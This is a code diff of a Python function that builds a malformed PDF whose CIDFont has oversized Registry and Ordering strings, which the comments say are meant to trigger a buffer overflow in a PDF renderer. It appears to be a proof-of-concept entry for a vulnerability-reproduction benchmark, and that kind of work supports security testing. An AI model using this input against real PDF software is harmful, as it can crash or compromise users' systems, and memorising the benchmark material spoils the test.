@@ -1,122 +1,65 @@
 import os
-import tarfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        def pad_offset(n: int) -> bytes:
-            return f"{n:010d} 00000 n \n".encode("ascii")
-
-        # Generate long Registry and Ordering strings to trigger the fallback overflow
-        # Use large, but reasonable sizes to ensure overflow in vulnerable versions
+        # Create very long Registry and Ordering strings to trigger the fallback buffer overflow
+        # Keep total size around ~80KB to remain close to the ground-truth, but content is what matters.
         reg_len = 40000
-        ord_len = 40000
-        registry_str = "(" + ("A" * reg_len) + ")"
-        ordering_str = "(" + ("B" * ord_len) + ")"
+        ord_len = 38000  # slightly less to keep total size near 80KB
 
-        # PDF objects
-        objs = []
+        registry = "A" * reg_len
+        ordering = "B" * ord_len
+
+        # Build PDF objects
+        def make_obj(obj_num: int, content: bytes) -> bytes:
+            return f"{obj_num} 0 obj\n".encode() + content + b"\nendobj\n"
+
+        # Header
+        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
 
         # 1: Catalog
-        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
-        objs.append(obj1)
+        obj1 = make_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
 
         # 2: Pages
-        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        objs.append(obj2)
+        obj2 = make_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
 
-        # 3: Page
-        obj3 = (
-            "3 0 obj\n"
-            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
-            "   /Resources << /Font << /F1 4 0 R >> >>\n"
-            "   /Contents 7 0 R\n"
-            ">>\n"
-            "endobj\n"
-        )
-        objs.append(obj3)
+        # 3: Page with resource referencing font F1 and contents
+        page_dict = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] " \
+                    b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
+        obj3 = make_obj(3, page_dict)
 
-        # 4: Type0 Font with unknown Encoding to trigger fallback; DescendantFonts points to CIDFont
-        obj4 = (
-            "4 0 obj\n"
-            "<< /Type /Font /Subtype /Type0 /BaseFont /CIDFontTest\n"
-            "   /Encoding /NotARealCMap\n"
-            "   /DescendantFonts [5 0 R]\n"
-            ">>\n"
-            "endobj\n"
-        )
-        objs.append(obj4)
+        # 4: Type0 font referencing CIDFont as descendant
+        obj4 = make_obj(4, b"<< /Type /Font /Subtype /Type0 /BaseFont /ABCDEE+MyCIDFont "
+                           b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>")
 
-        # 5: CIDFontType2 with long CIDSystemInfo strings
-        obj5 = (
-            "5 0 obj\n"
-            "<< /Type /Font\n"
-            "   /Subtype /CIDFontType2\n"
-            "   /BaseFont /CIDFontTest\n"
-            "   /CIDSystemInfo << /Registry " + registry_str + " /Ordering " + ordering_str + " /Supplement 0 >>\n"
-            "   /FontDescriptor 6 0 R\n"
-            "   /DW 1000\n"
-            ">>\n"
-            "endobj\n"
-        )
-        objs.append(obj5)
+        # 5: Content stream that selects F1 so the engine tries to load the font and triggers fallback
+        stream_data = b"BT /F1 12 Tf 72 720 Td (Hello) Tj ET"
+        obj5_content = b"<< /Length " + str(len(stream_data)).encode() + b" >>\nstream\n" + stream_data + b"\nendstream"
+        obj5 = make_obj(5, obj5_content)
 
-        # 6: FontDescriptor minimal
-        obj6 = (
-            "6 0 obj\n"
-            "<< /Type /FontDescriptor /FontName /CIDFontTest /Flags 32 /ItalicAngle 0\n"
-            "   /Ascent 1000 /Descent -200 /CapHeight 700 /StemV 80 /FontBBox [0 0 1000 1000]\n"
-            ">>\n"
-            "endobj\n"
-        )
-        objs.append(obj6)
+        # 6: CIDFont with oversized CIDSystemInfo Registry/Ordering strings
+        # According to PDF spec, Registry and Ordering in CIDSystemInfo are strings (in parentheses)
+        cid_system_info = f"<< /Registry ({registry}) /Ordering ({ordering}) /Supplement 0 >>".encode()
+        obj6 = make_obj(6, b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /MyCIDFont /CIDSystemInfo " + cid_system_info + b" >>")
 
-        # 7: Contents stream
-        stream_data = b"BT /F1 24 Tf 72 720 Td (Hello) Tj ET\n"
-        obj7 = (
-            "7 0 obj\n"
-            f"<< /Length {len(stream_data)} >>\n"
-            "stream\n"
-        ).encode("ascii") + stream_data + b"endstream\nendobj\n"
-        # Combine mixed types by ensuring we append as bytes consistently later
-        objs.append(obj7)
-
-        # Build PDF
-        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
-        body = bytearray()
+        # Assemble all objects and compute xref offsets
+        objects = [obj1, obj2, obj3, obj4, obj5, obj6]
         offsets = []
-
-        # Assemble objects, tracking offsets
         current_offset = len(header)
-        for o in objs:
+        for obj in objects:
             offsets.append(current_offset)
-            if isinstance(o, bytes):
-                body.extend(o)
-                current_offset += len(o)
-            else:
-                b = o.encode("latin1")
-                body.extend(b)
-                current_offset += len(b)
+            current_offset += len(obj)
 
-        # XREF
-        xref_start = len(header) + len(body)
-        xref = bytearray()
-        xref.extend(b"xref\n")
-        # One subsection: objects 1..N
-        size = len(objs) + 1
-        xref.extend(f"0 {size}\n".encode("ascii"))
-        # Entry 0 is the free head
-        xref.extend(b"0000000000 65535 f \n")
+        # Build xref
+        xref_start = current_offset
+        xref_entries = [b"0000000000 65535 f \n"]
         for off in offsets:
-            xref.extend(pad_offset(off))
+            xref_entries.append(f"{off:010d} 00000 n \n".encode())
+        xref = b"xref\n0 7\n" + b"".join(xref_entries)
 
         # Trailer
-        trailer = (
-            "trailer\n"
-            "<< /Size {size} /Root 1 0 R >>\n"
-            "startxref\n"
-            "{start}\n"
-            "%%EOF\n"
-        ).format(size=size, start=xref_start).encode("ascii")
+        trailer = b"trailer\n<< /Size 7 /Root 1 0 R >>\n"
+        startxref = b"startxref\n" + str(xref_start).encode() + b"\n%%EOF\n"
 
-        pdf = header + body + xref + trailer
+        pdf = header + b"".join(objects) + xref + trailer + startxref
         return pdf
